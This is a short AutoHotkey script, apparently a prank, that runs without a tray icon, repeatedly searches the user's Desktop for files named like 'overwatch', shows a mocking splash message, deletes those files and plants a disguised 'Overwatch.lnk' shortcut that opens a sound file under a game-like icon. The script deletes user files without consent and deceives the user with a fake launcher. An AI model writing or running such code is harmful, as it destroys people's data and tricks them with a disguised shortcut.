#NoTrayIcon
; Version 2.7 beta
; This checks for files and overwrites it on Desktop.
Start:
CheckForFile:
IfExist, %A_Desktop%\*overwatch*.*
SplashTextOn, 160, 20, nope, no you didnt 凸(^_^)凸
Goto, Payload
IfNotExist, %A_Desktop%\*overwatch*.*
Goto, Start
Payload:
FileDelete, %A_Desktop%\*overwatch*.*
FileCreateShortcut, C:\blah\lol.wav, %A_Desktop%\Overwatch.lnk, , , Guess What, C:\blah\overwch.ico, ,
ExitApp
ESC::ExitApp
